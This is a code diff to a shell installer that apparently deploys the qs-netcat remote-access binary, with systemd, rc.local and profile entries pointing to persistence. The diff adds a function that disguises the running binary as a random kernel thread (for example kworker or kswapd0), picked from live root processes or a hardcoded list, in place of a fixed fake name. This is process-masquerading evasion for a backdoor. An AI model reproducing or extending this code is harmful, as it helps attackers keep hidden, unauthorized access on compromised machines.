@@ -137,6 +137,30 @@ xmkdir() {
 	true
 }
 
+get_random_kernel_proc() {
+  proc_name_arr=(
+    "[kstrp]"
+    "[watchdogd]"
+    "[ksmd]"
+    "[kswapd0]"
+    "[card0-crtc8]"
+    "[mm_percpu_wq]"
+    "[rcu_preempt]"
+    "[kworker]"
+    "[raid5wq]"
+    "[slub_flushwq]"
+    "[netns]"
+    "[kaluad]"
+  )
+  local proc_name
+  if [[ "$1" = "darwin" ]]; then
+    proc_name=$(pgrep -lu root|cut -d' ' -f2|shuf -n 1)
+  else
+    proc_name=$(pgrep -alu root "kworker"|shuf -n 1)
+  fi
+  [[ -z $proc_name ]] && proc_name="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+  echo -n "$proc_name"
+}
 
 detect_arch() {
 	case $(uname -m) in
@@ -510,7 +534,7 @@ FALLBACK_RELEASE="v0.0.2-beta"
 QS_DIR=$(create_qs_dir)
 RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
 BIN_NAME="qs-netcat"
-PROC_HIDDEN_NAME="[kcached]"
+PROC_HIDDEN_NAME="$(get_random_kernel_proc "$OS_NAME")"
 SERVICE_FILE="/etc/systemd/system/$RAND_NAME.service"
 RCLOCAL_FILE="/etc/rc.local"
 PROFILE_FILE="$HOME/.profile"
@@ -524,6 +548,7 @@ print_status "Home: $HOME"
 print_status "Shell: $SHELL"
 print_status "Binary: $BIN_NAME"
 print_status "Deploy Dir: $QS_DIR"
+print_debug "Proc. Name: $PROC_HIDDEN_NAME"
 echo "" ## --- break after system info
 
 if [[ "$QS_DIR" =~ ^.*/(tmp|shm).* ]]; then
